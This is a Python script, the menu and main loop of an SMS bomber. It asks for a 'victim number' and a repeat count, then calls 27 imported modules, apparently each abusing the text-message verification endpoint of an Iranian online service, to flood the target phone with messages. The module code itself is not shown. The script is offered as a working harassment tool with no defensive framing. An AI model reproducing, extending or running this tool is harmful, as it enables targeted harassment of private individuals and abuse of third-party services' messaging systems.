import requests
from time import sleep
from colorama import Fore as color  
from modules import delino ,veal ,namava ,divarbomber, snapbomber, tapsibomber, ketabaz, digistyle, irantic, offch ,behtarin , dr , food , itol , pezshk , rojashop , tagh , talent , tam , tikban ,gardesh ,gapfilm , sandbox , banimood , drnext ,paz ,dryab
from menu import menu
import sys, os



bold = '\033[1m'
end = '\033[0m'
while True:

    try:
        os.system('clear')
        menu.banner(); menu.menu_respaws()
        user_input = input(color.WHITE+"Enter Your Choice => ")
        if (user_input == '1'):
            os.system('clear')
            menu.banner()
            print(color.RED+"[*] Enter the number without -[0,98].")
            try:
                number = input(color.LIGHTRED_EX+"[+] Enter the victim number :")
            except:
                print(color.LIGHTBLUE_EX+"[*] "+"Please Enter The Phone Number....")
                sleep(1)
                sys.exit()
            try:
                user_input_loop = int(input(color.LIGHTCYAN_EX+"[+] How many times you want to send messages? => "))
            except:
                print(color.RED+"Enter number....")
                sleep(1)
                sys.exit()
            try:
                print("""{0}COUNT \t\t {1}Time """.format(bold,bold))
                sms = 1
                for i in range(user_input_loop):
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');divarbomber.divar_bomber(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');snapbomber.snap_bomber(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');ketabaz.ketbbaz(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');digistyle.digistyle(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');irantic.irantic(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');offch.offcha(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');veal.veal(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');delino.delino(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');namava.namava_bomber(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');tapsibomber.tapsi_bomber(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');dr.dr_bomber(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');behtarin.behtarino_bomber(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');food.snapfood_bomber(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');tagh.tagh_bomber(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');talent.talent_bomber(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');tam.tamland_bomber(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');rojashop.rojashop_bomber(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');pezshk.pezshk_bomber(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');itol.itol_bomber(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');tikban.tikban_bomber(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');gardesh.gardesh(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');gapfilm.gapfilm(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');sandbox.sandbox(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');banimood.bani(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');paz.paziresh(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');drnext.drnext(number)
                    sms += 1
                    sleep(1)
                    print(color.LIGHTGREEN_EX +end+str(sms), end=' ');dryab.dryab(number)
                    sms += 1
                    sleep(1)




                print(color.LIGHTYELLOW_EX+end+"[+] Done...")
                sleep(5)
            except:
                print(color.RED+"[-] Something bad happend....")
                sleep(1)
                raise
                sys.exit()
                

        elif (user_input == '0'):
            print(color.WHITE+"[*] Thanks for being here....")
            sleep(1)
            sys.exit()
        else:
            print(color.RED+"Something went Wrong...")
            sleep(1)
            sys.exit()
    except:
        print(color.RED+"[-] Something Went Wrong...")
        sleep(1)
        raise
        sys.exit()
        



